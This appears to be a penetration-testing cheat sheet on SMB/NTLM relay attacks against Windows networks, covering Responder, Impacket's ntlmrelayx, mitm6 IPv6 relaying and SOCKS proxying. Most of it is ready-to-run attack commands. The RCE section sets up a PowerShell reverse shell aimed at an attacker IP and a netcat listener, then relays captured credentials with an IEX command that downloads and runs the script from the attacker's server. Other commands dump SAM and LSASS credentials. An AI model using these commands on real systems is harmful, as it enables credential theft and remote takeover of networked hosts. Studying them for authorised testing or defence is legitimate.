SMB Relay is an attack that abuses the **Server Message Block (SMB)** protocol, which is commonly used in Windows networks to share files, printers, and other resources.

The attacker takes advantage of the way SMB authentication works.  
Instead of stealing a password, the attacker **impersonates the legitimate SMB server** and then **relays** the victim’s authentication attempt to a real server to gain access.

## Key Concepts

1. **SMB (Server Message Block) Protocol**:
    
    - A network protocol used for sharing files, printers, and serial ports.
    - Operates over TCP/IP using ports 139 and 445.
2. **NTLM (NT LAN Manager) Authentication**:
    
    - A suite of Microsoft security protocols intended to provide authentication, integrity, and confidentiality to users.
    - SMB often uses NTLM for authentication.
3. **Relay Attack**:
    
    - An attacker intercepts the authentication process.
    - Instead of cracking the intercepted credentials, the attacker relays them to another server to authenticate.

## Basic Attack Process

1. **Configuring Responder**:

- Modify the `Responder.conf` configuration file to enable or disable specific protocols. For SMB relay, ensure that SMB and HTTP are set to `On` and that `HTTP Server` is also enabled.
```bash
sudo nano /etc/responder/Responder.conf
```
- Responder is a tool used to capture SMB/NTLM authentication attempts from victims. It works by spoofing services like SMB, DNS, and HTTP to trick devices into sending authentication requests to the attacker.

```bash
sudo responder -I eth0 
```


2. **Setting Up SMB Relay with Impacket**:
- Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to. You can identify the hosts with SMB enabled using:
```bash
nxc smb 192.168.1.0/24
```
- While the Responder is active use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
3. **Gaining access**:
Perform post-authentication actions:

- Dump sensitive information (e.g., SAM database, LSASS memory).
- Execute commands remotely.
- Create a reverse shell.
```bash
sudo impacket-ntlmrelayx -tf targets.txt --dump
sudo impacket-ntlmrelayx -tf targets.txt -c "whoami"
```

## RCE Attack Process
- Copy the PowerShell Invoke-PowershellTCP.ps1 script and open it for editing. 
```bash
cp Invoke-PowershellTCP.ps1 PS.ps1
nano PS.ps1
```
- Add the following line at the end of the file:
```bash
Invoke-PowershellTCP -reverse -IPAddress <attacker_ip> -Port 4444
```
- Start a Python HTTP server and a listener:
```bash
pyhton3 -m http.server 80
nc -lvnp 4444
```
- Run the responder service to capture authentication attempts 
```bash
sudo responder -I eth0 
```
- Execute the NTLMRelay inducing to fetch and execute the hosted script.
```bash
sudo impacket-ntlmrelayx -tf targets.txt -c "powershell IEX(New-Object Net.WebClient).downloadString('http://<attacker_ip>:80/PS.ps1')"
```
## IPv6 SMB Relaying Attack Process
IPv6 relaying leverages the fact that many modern networks have IPv6 enabled by default, even if administrators primarily use IPv4. Attackers exploit IPv6 name resolution to trick clients into authenticating against a rogue server controlled by the attacker, allowing NTLM credentials to be captured and relayed.

1. **Start mitm6:**

```bash
mitm6 -d <domain>
```

- This announces fake IPv6 RAs and provides a rogue DNS server.
- All domain-joined Windows clients will attempt to resolve domain resources via the attacker.

2. **Capture NTLM Authentication:**

- When a client attempts to access any SMB or HTTP resource in the domain, it authenticates using NTLMv2.
- The authentication request is sent to the attacker instead of the legitimate server.

2. **Relay with NTLMRelayx:**

- Relay these IPv6-captured NTLM credentials to a target system:
```bash
sudo ntlmrelayx.py -6 -tf targets.txt -socks -debug -smb2support
```

- The `-6` flag ensures the relay works over IPv6.
- `-smb2support` is crucial as modern Windows systems often enforce SMB2/3.
- `-socks` allows connecting through a SOCKS proxy to interact with the compromised account.

4. **Connecting to the Relayed Account:**

Once a relay has been successfully established, you can access the account using a **SOCKS proxy**:

```bash
proxychains crackmapexec smb <target-ip> -u <user> -p <anypassword> -d <domain>
```

---


## NTLMRelayx.py

**ntlmrelayx.py** is a powerful tool from the Impacket toolkit used for relaying captured NTLM authentication attempts to other network services. It is particularly effective in Windows Active Directory (AD) environments, allowing attackers to gain unauthorized access to network resources by relaying credentials.

#### Configuring Target List:

- Create a `targets.txt` file with the IP addresses or hostnames of the target AD servers you want to relay the captured credentials to.
```bash
192.168.1.10 
192.168.1.11
```

#### Starting NTLMRelayx.py:

- Use NTLMRelayx.py to relay captured NTLM authentication attempts to the targets listed in `targets.txt`.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
- Also, NTLMRelayx.py can be configured to execute a certain command of our election after pawning one of the target hosts. 
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
```


